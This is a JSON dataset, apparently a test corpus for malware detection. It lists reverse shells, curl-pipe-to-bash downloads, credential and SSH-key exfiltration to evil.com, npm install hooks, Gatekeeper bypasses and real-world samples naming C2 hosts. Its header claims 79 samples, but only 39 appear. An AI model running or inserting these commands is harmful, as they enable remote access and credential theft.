{
  "version": "1.2",
  "generated": "2026-01-06",
  "total_samples": 79,
  "categories": {
    "reverse_shell": {
      "count": 8,
      "mitre_technique": "T1059.004",
      "severity_range": [9, 10]
    },
    "staged_download": {
      "count": 6,
      "mitre_technique": "T1105",
      "severity_range": [7, 8]
    },
    "persistence": {
      "count": 6,
      "mitre_technique": "T1546.004",
      "severity_range": [7, 8]
    },
    "credential_theft": {
      "count": 6,
      "mitre_technique": "T1555.001",
      "severity_range": [8, 10]
    },
    "crypto_theft": {
      "count": 5,
      "mitre_technique": "T1005",
      "severity_range": [9, 10]
    },
    "defense_evasion": {
      "count": 4,
      "mitre_technique": "T1553.001",
      "severity_range": [8, 9]
    },
    "social_engineering": {
      "count": 3,
      "mitre_technique": "T1204.001",
      "severity_range": [9, 10]
    },
    "obfuscation": {
      "count": 4,
      "mitre_technique": "T1027",
      "severity_range": [5, 7]
    },
    "environment_harvesting": {
      "count": 6,
      "mitre_technique": "T1082",
      "severity_range": [5, 7]
    },
    "anti_analysis": {
      "count": 4,
      "mitre_technique": "T1497",
      "severity_range": [4, 6]
    },
    "combined_attack": {
      "count": 3,
      "mitre_technique": "multiple",
      "severity_range": [9, 10]
    },
    "supply_chain": {
      "count": 13,
      "mitre_technique": "T1195.002",
      "severity_range": [7, 9],
      "source": "datadog_guarddog"
    },
    "real_world_sample": {
      "count": 11,
      "mitre_technique": "multiple",
      "severity_range": [6, 10],
      "source": "datadog_real_samples",
      "note": "Extracted from actual malicious PyPI/npm packages"
    }
  },
  "samples": [
    {
      "id": "mal_001",
      "name": "bash_dev_tcp",
      "content": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "category": "reverse_shell",
      "mitre": "T1059.004",
      "severity": 10,
      "source": "gtfobins",
      "description": "Classic bash reverse shell using /dev/tcp"
    },
    {
      "id": "mal_002",
      "name": "nc_e_revshell",
      "content": "nc -e /bin/sh 192.168.1.1 1234",
      "category": "reverse_shell",
      "mitre": "T1059.004",
      "severity": 10,
      "source": "gtfobins",
      "description": "Netcat reverse shell with -e flag"
    },
    {
      "id": "mal_003",
      "name": "python_pty_spawn",
      "content": "import pty; pty.spawn('/bin/bash')",
      "category": "reverse_shell",
      "mitre": "T1059.004",
      "severity": 9,
      "source": "gtfobins",
      "description": "Python PTY spawn for shell upgrade"
    },
    {
      "id": "mal_004",
      "name": "curl_pipe_bash",
      "content": "curl https://evil.com/install.sh | bash",
      "category": "staged_download",
      "mitre": "T1105",
      "severity": 7,
      "source": "mitre_attack",
      "description": "Classic curl|bash execution"
    },
    {
      "id": "mal_005",
      "name": "wget_pipe_sh",
      "content": "wget -qO- https://evil.com/script.sh | sh",
      "category": "staged_download",
      "mitre": "T1105",
      "severity": 7,
      "source": "mitre_attack",
      "description": "wget piped to sh"
    },
    {
      "id": "mal_006",
      "name": "launchagent_install",
      "content": "cp /tmp/evil.plist ~/Library/LaunchAgents/com.evil.plist",
      "category": "persistence",
      "mitre": "T1543.001",
      "severity": 8,
      "source": "amos_ioc",
      "description": "macOS LaunchAgent persistence"
    },
    {
      "id": "mal_007",
      "name": "bashrc_backdoor",
      "content": "echo 'curl evil.com/backdoor.sh | bash' >> ~/.bashrc",
      "category": "persistence",
      "mitre": "T1546.004",
      "severity": 8,
      "source": "mitre_attack",
      "description": "Shell profile modification for persistence"
    },
    {
      "id": "mal_008",
      "name": "keychain_dump",
      "content": "security dump-keychain -d login.keychain",
      "category": "credential_theft",
      "mitre": "T1555.001",
      "severity": 10,
      "source": "amos_ioc",
      "description": "macOS Keychain dumping (AMOS IOC)"
    },
    {
      "id": "mal_009",
      "name": "aws_creds_exfil",
      "content": "cat ~/.aws/credentials | curl -X POST -d @- https://evil.com",
      "category": "credential_theft",
      "mitre": "T1552.001",
      "severity": 9,
      "source": "threat_intel",
      "description": "AWS credential exfiltration"
    },
    {
      "id": "mal_010",
      "name": "exodus_wallet_theft",
      "content": "cp -r ~/Library/Application\\ Support/Exodus/exodus.wallet /tmp/",
      "category": "crypto_theft",
      "mitre": "T1005",
      "severity": 10,
      "source": "amos_ioc",
      "description": "Exodus crypto wallet theft (AMOS IOC)"
    },
    {
      "id": "mal_011",
      "name": "metamask_extension_theft",
      "content": "cp -r ~/Library/Application\\ Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn /tmp/",
      "category": "crypto_theft",
      "mitre": "T1005",
      "severity": 10,
      "source": "amos_ioc",
      "description": "MetaMask browser extension theft"
    },
    {
      "id": "mal_012",
      "name": "xattr_quarantine_remove",
      "content": "xattr -d com.apple.quarantine /Applications/Malware.app",
      "category": "defense_evasion",
      "mitre": "T1553.001",
      "severity": 9,
      "source": "amos_ioc",
      "description": "macOS Gatekeeper bypass via xattr"
    },
    {
      "id": "mal_013",
      "name": "spctl_disable",
      "content": "sudo spctl --master-disable",
      "category": "defense_evasion",
      "mitre": "T1553.001",
      "severity": 9,
      "source": "threat_intel",
      "description": "Disable macOS Gatekeeper entirely"
    },
    {
      "id": "mal_014",
      "name": "clickfix_verify_human",
      "content": "echo 'Please verify you are human by running this command'",
      "category": "social_engineering",
      "mitre": "T1204.001",
      "severity": 9,
      "source": "clickfix_campaign",
      "description": "ClickFix social engineering lure"
    },
    {
      "id": "mal_015",
      "name": "base64_decode_exec",
      "content": "echo 'Y3VybCBldmlsLmNvbS9tYWx3YXJl' | base64 -d | bash",
      "category": "obfuscation",
      "mitre": "T1027",
      "severity": 6,
      "source": "mitre_attack",
      "description": "Base64 obfuscated command execution"
    },
    {
      "id": "mal_016",
      "name": "supply_chain_subprocess_popen",
      "content": "subprocess.Popen(['curl', 'https://evil.com/payload.sh', '|', 'bash'], shell=True)",
      "category": "supply_chain",
      "mitre": "T1059.006",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "subprocess.Popen in setup.py (GuardDog code-execution.yml)"
    },
    {
      "id": "mal_017",
      "name": "supply_chain_os_system",
      "content": "os.system('curl https://evil.com/install.sh | bash')",
      "category": "supply_chain",
      "mitre": "T1059.006",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "os.system in setup.py (GuardDog code-execution.yml)"
    },
    {
      "id": "mal_018",
      "name": "supply_chain_eval_remote",
      "content": "eval(urllib.request.urlopen('https://evil.com/code.py').read())",
      "category": "supply_chain",
      "mitre": "T1059.006",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "eval with remote code fetch (GuardDog code-execution.yml)"
    },
    {
      "id": "mal_019",
      "name": "supply_chain_exec_base64",
      "content": "exec(__import__('base64').b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo'))",
      "category": "supply_chain",
      "mitre": "T1027",
      "severity": 8,
      "source": "datadog_guarddog",
      "description": "exec with base64 obfuscation (GuardDog exec-base64.yml)"
    },
    {
      "id": "mal_020",
      "name": "supply_chain_env_exfil",
      "content": "requests.post('https://evil.com/collect', data={'env': str(os.environ)})",
      "category": "supply_chain",
      "mitre": "T1082",
      "severity": 8,
      "source": "datadog_guarddog",
      "description": "Environment exfiltration (GuardDog exfiltrate-sensitive-data.yml)"
    },
    {
      "id": "mal_021",
      "name": "supply_chain_aws_theft",
      "content": "urllib.request.urlopen(f'https://evil.com/aws?key={os.getenv(\"AWS_ACCESS_KEY_ID\")}')",
      "category": "supply_chain",
      "mitre": "T1552.001",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "AWS credential theft (GuardDog exfiltrate-sensitive-data.yml)"
    },
    {
      "id": "mal_022",
      "name": "supply_chain_ssh_socket",
      "content": "s.connect(('evil.com', 4444)); s.send(open('~/.ssh/id_rsa').read().encode())",
      "category": "supply_chain",
      "mitre": "T1552.004",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "SSH key exfiltration via socket"
    },
    {
      "id": "mal_023",
      "name": "supply_chain_npm_postinstall",
      "content": "{\"scripts\": {\"postinstall\": \"curl https://evil.com/payload.sh | bash\"}}",
      "category": "supply_chain",
      "mitre": "T1195.002",
      "severity": 8,
      "source": "datadog_guarddog",
      "description": "npm postinstall hook (GuardDog npm-install-script.yml)"
    },
    {
      "id": "mal_024",
      "name": "supply_chain_npm_preinstall",
      "content": "{\"scripts\": {\"preinstall\": \"node -e \\\"require('child_process').exec('curl evil.com|sh')\\\"\"}}",
      "category": "supply_chain",
      "mitre": "T1195.002",
      "severity": 8,
      "source": "datadog_guarddog",
      "description": "npm preinstall with node -e (GuardDog npm-install-script.yml)"
    },
    {
      "id": "mal_025",
      "name": "supply_chain_download_exec",
      "content": "urllib.request.urlretrieve('https://evil.com/malware', '/tmp/m'); os.chmod('/tmp/m', stat.S_IXUSR); os.system('/tmp/m')",
      "category": "supply_chain",
      "mitre": "T1105",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "Download and execute binary (GuardDog download-executable.yml)"
    },
    {
      "id": "mal_026",
      "name": "supply_chain_fileless",
      "content": "exec(urllib.request.urlopen('https://evil.com/payload.py').read())",
      "category": "supply_chain",
      "mitre": "T1059.006",
      "severity": 9,
      "source": "datadog_guarddog",
      "description": "Fileless/memory-only execution"
    },
    {
      "id": "mal_027",
      "name": "supply_chain_nohup_bg",
      "content": "os.system('nohup curl https://evil.com/backdoor.sh | bash &>/dev/null &')",
      "category": "supply_chain",
      "mitre": "T1059.004",
      "severity": 7,
      "source": "datadog_guarddog",
      "description": "Silent background execution"
    },
    {
      "id": "mal_028",
      "name": "supply_chain_marshal_zlib",
      "content": "exec(marshal.loads(zlib.decompress(b'x\\x9c...')))",
      "category": "supply_chain",
      "mitre": "T1027",
      "severity": 8,
      "source": "datadog_guarddog",
      "description": "marshal/zlib decompression execution (GuardDog exec-base64.yml)"
    },
    {
      "id": "mal_029",
      "name": "real_boogipop_revshell",
      "content": "os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")",
      "category": "real_world_sample",
      "mitre": "T1059.004",
      "severity": 10,
      "source": "datadog_real_samples",
      "description": "Real sample from boogishell/myshellcode/shellapp PyPI packages",
      "c2": "114.116.119.253:7777",
      "author": "boogipop"
    },
    {
      "id": "mal_030",
      "name": "real_discord_hook_dropper",
      "content": "exec(_uurlopen('https://paste.bingner.com/paste/4yndv/raw').read())",
      "category": "real_world_sample",
      "mitre": "T1105",
      "severity": 9,
      "source": "datadog_real_samples",
      "description": "Real sample from discord-hook PyPI package - fileless dropper",
      "c2": "paste.bingner.com"
    },
    {
      "id": "mal_031",
      "name": "real_npm_dependency_confusion",
      "content": "wget \"https://webhook.site/UUID?user=$(whoami)&hostname=$(hostname)\"",
      "category": "real_world_sample",
      "mitre": "T1195.002",
      "severity": 8,
      "source": "datadog_real_samples",
      "description": "Real sample from 0vulns-dependency-confusion-poc npm package"
    },
    {
      "id": "mal_032",
      "name": "real_reverseshell_tcp",
      "content": "p = run(command, shell=True, stdout=PIPE, stderr=PIPE)",
      "category": "real_world_sample",
      "mitre": "T1059.006",
      "severity": 10,
      "source": "datadog_real_samples",
      "description": "Real sample from ReverseShell PyPI package (mauricelambert434)"
    },
    {
      "id": "mal_033",
      "name": "real_pythonw_hidden",
      "content": "start {sys.executable.replace('.exe', 'w.exe')}",
      "category": "real_world_sample",
      "mitre": "T1564.003",
      "severity": 7,
      "source": "datadog_real_samples",
      "description": "Hidden window execution via pythonw.exe"
    },
    {
      "id": "mal_034",
      "name": "real_shell_substitution_exfil",
      "content": "curl \"https://attacker.com?user=$(whoami)&host=$(hostname)\"",
      "category": "real_world_sample",
      "mitre": "T1082",
      "severity": 8,
      "source": "datadog_real_samples",
      "description": "Shell command substitution for system info exfiltration"
    },
    {
      "id": "mal_035",
      "name": "real_pastebin_c2",
      "content": "exec(urlopen('https://pastebin.com/raw/XXXXX').read())",
      "category": "real_world_sample",
      "mitre": "T1102",
      "severity": 9,
      "source": "datadog_real_samples",
      "description": "Pastebin as C2 for payload delivery"
    },
    {
      "id": "mal_036",
      "name": "real_setuptools_custom_install",
      "content": "class CustomInstallCommand(install): def run(self): install.run(self)",
      "category": "real_world_sample",
      "mitre": "T1195.002",
      "severity": 8,
      "source": "datadog_real_samples",
      "description": "Malicious setuptools custom install command pattern"
    },
    {
      "id": "mal_037",
      "name": "real_obfuscated_imports",
      "content": "from urllib.request import urlopen as _uurlopen",
      "category": "real_world_sample",
      "mitre": "T1027",
      "severity": 6,
      "source": "datadog_real_samples",
      "description": "Variable name obfuscation with underscore prefixes"
    },
    {
      "id": "mal_038",
      "name": "real_spyware_keylogger",
      "content": "KeyLogger, ScreenLogger, WebcamLogger, AudioLogger",
      "category": "real_world_sample",
      "mitre": "T1056.001",
      "severity": 10,
      "source": "datadog_real_samples",
      "description": "Full-featured SpyWare package (mauricelambert434)"
    },
    {
      "id": "mal_039",
      "name": "real_npm_preinstall_hook",
      "content": "{\"scripts\": {\"preinstall\": \"...\"}}",
      "category": "real_world_sample",
      "mitre": "T1195.002",
      "severity": 8,
      "source": "datadog_real_samples",
      "description": "npm preinstall hook exploitation pattern"
    }
  ],
  "sources": {
    "gtfobins": {
      "name": "GTFOBins",
      "url": "https://gtfobins.github.io/",
      "license": "GPL-3.0"
    },
    "mitre_attack": {
      "name": "MITRE ATT&CK",
      "url": "https://attack.mitre.org/",
      "license": "CC BY-SA 4.0"
    },
    "amos_ioc": {
      "name": "AMOS Stealer IOCs",
      "sources": [
        "SentinelOne 2024",
        "Trend Micro MDR 2025",
        "Palo Alto Unit42 2024"
      ]
    },
    "clickfix_campaign": {
      "name": "ClickFix Campaign",
      "year": "2024-2025",
      "description": "Social engineering attacks using fake CAPTCHA"
    },
    "threat_intel": {
      "name": "Community Threat Intelligence",
      "sources": [
        "MalwareBazaar",
        "URLhaus",
        "Security vendor reports"
      ]
    },
    "datadog_guarddog": {
      "name": "DataDog GuardDog",
      "url": "https://github.com/DataDog/guarddog",
      "license": "Apache-2.0",
      "description": "Supply chain attack detection patterns from DataDog's GuardDog tool",
      "rules": [
        "code-execution.yml",
        "exec-base64.yml",
        "exfiltrate-sensitive-data.yml",
        "npm-install-script.yml",
        "download-executable.yml"
      ],
      "dataset": {
        "name": "DataDog Malicious Software Packages Dataset",
        "url": "https://github.com/DataDog/malicious-software-packages-dataset",
        "samples": 17952,
        "ecosystems": ["npm", "pypi"]
      }
    },
    "datadog_real_samples": {
      "name": "DataDog Real Malware Samples",
      "url": "https://github.com/DataDog/malicious-software-packages-dataset",
      "license": "Apache-2.0",
      "description": "Actual malware extracted from DataDog's malicious packages dataset",
      "extraction_date": "2026-01-06",
      "password": "infected",
      "packages_analyzed": [
        "boogishell",
        "myshellcode",
        "shellapp",
        "discord-hook",
        "0vulns-dependency-confusion-poc",
        "ReverseShell",
        "SpyWare"
      ],
      "c2_infrastructure": {
        "114.116.119.253:7777": "boogipop malware family",
        "paste.bingner.com": "discord-hook dropper",
        "webhook.site": "dependency confusion attacks"
      }
    }
  }
}
